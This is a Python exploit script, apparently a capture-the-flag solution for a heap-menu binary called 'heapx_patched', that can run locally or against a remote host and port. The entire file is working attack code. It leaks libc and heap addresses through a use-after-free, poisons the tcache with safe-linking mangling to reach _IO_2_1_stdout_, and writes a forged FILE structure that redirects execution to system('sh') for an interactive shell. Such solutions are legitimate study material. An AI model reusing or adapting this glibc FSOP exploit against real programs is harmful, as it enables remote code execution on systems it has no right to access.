#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./heapx_patched', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x12FA
brva 0x140A
brva 0x15B9
# brva 0x1570
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()

    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def new(size):
    sla(b'> ', b'new')
    sln(size)

def write(index, content):
    sla(b'> ', f'write'.encode())
    sln(index)
    s(content)

def read(index):
    sla(b'> ', b'read')
    sln(index)

def delete(index):
    sla(b'> ', b'delete')
    sln(index)

# ==================== EXPLOIT ====================
p = start()

new(0x410) # 0
new(0x100) # 1
new(0x100) # 2
new(0x20) # 3

delete(0)
read(0)

libc.address = fixleak(rb(6)) - 0x210b20
slog('libc base @ %#x', libc.address)


delete(1)
delete(2)

read(1)
heap = ( fixleak(rb(5)) << 12 ) - 0x1000
slog('heap base @ %#x', heap)

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    pause()

target = libc.sym._IO_2_1_stdout_
info('_IO_2_1_stdout_ @ %#x', target)
info('mangle %#x to %#x', target, mangle(heap, target))

sla(b'> ', f'write'.encode())
sln(2)
s(b'.')
sla(b'Enter log data: ', p64(mangle(heap+0x17e0, libc.sym._IO_2_1_stdout_)) + b'AA')

# padding 2
new(0x100) # invalid
new(0x100) # 4
new(0x100) # 5

fp = FileStructure()
fp.flags = 0xfbad2484 + (u32(b"||sh") << 32)
fp._IO_read_end = libc.sym.system
fp._lock = libc.sym._IO_2_1_stdout_ + 0x50
fp._wide_data = libc.sym._IO_2_1_stdout_
fp.vtable = libc.sym._IO_wfile_jumps - 0x20
payload = bytes(fp) + p64(libc.sym._IO_2_1_stdout_ + 0x10 - 0x68)

sla(b'> ', f'write'.encode())
sln(5)
s(b'.')
sla(b'Enter log data: ', payload)


interactive()
